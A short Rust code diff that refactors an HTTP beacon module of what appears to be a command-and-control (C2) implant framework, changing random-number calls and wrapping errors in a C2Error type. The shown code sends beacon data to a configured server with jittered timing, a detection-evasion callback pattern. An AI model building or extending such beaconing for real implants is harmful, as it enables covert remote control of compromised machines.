@@ -1,4 +1,5 @@
 use std::time::Duration;
+use rand::RngExt;
 
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
 pub struct BeaconConfig {
@@ -72,23 +73,23 @@ impl HttpBeacon {
 
     fn jitter_delay(&self) -> Duration {
         let base = self.config.interval_secs as f64;
-        let jitter = base * self.config.jitter_pct * rand::random::<f64>();
+        let jitter = base * self.config.jitter_pct * rand::rng().random::<f64>();
         let total = base + jitter - (self.config.jitter_pct * base / 2.0);
         Duration::from_secs_f64(total.max(1.0))
     }
 
-    pub async fn send_beacon(&self, data: &BeaconData) -> Result<BeaconResponse, String> {
+    pub async fn send_beacon(&self, data: &BeaconData) -> Result<BeaconResponse, crate::C2Error> {
         let resp = self.client
             .post(&self.config.server_url)
             .json(data)
             .send()
             .await
-            .map_err(|e| format!("beacon send failed: {}", e))?;
+            .map_err(|e| crate::C2Error::Transport(format!("beacon send failed: {}", e)))?;
 
         let br: BeaconResponse = resp
             .json()
             .await
-            .map_err(|e| format!("beacon parse failed: {}", e))?;
+            .map_err(|e| crate::C2Error::Transport(format!("beacon parse failed: {}", e)))?;
 
         Ok(br)
     }
